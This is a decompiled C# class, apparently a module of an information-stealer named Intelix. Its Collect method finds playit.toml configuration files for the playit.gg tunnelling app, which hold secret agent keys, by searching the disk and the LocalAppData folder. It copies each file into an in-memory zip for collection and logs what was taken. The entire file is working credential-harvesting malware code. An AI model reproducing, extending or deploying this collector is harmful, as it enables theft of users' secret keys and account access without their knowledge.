using System;
using System.IO;
using System.Threading.Tasks;
using Intelix.Helper;
using Intelix.Helper.Data;

namespace Intelix.Targets.Applications
{
	// Token: 0x0200004D RID: 77
	public class PlayIt : ITarget
	{
		// Token: 0x060000FA RID: 250 RVA: 0x0000E760 File Offset: 0x0000C960
		public void Collect(InMemoryZip zip, Counter counter)
		{
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "PlayIt";
			Parallel.ForEach<string>(ProcessWindows.FindFile("playit.toml"), delegate(string toml)
			{
				string text3 = "PlayIt\\playit" + RandomStrings.GenerateHashTag() + ".toml";
				zip.AddFile(text3, File.ReadAllBytes(toml));
				counterApplications.Files.Add(toml + " => " + text3);
			});
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "playit_gg", "playit.toml");
			bool flag = File.Exists(text);
			if (flag)
			{
				string text2 = "PlayIt\\playit.toml";
				zip.AddFile(text2, File.ReadAllBytes(text));
				counterApplications.Files.Add(text + " => " + text2);
			}
			bool flag2 = counterApplications.Files.Count > 0;
			if (flag2)
			{
				counter.Applications.Add(counterApplications);
			}
		}
	}
}
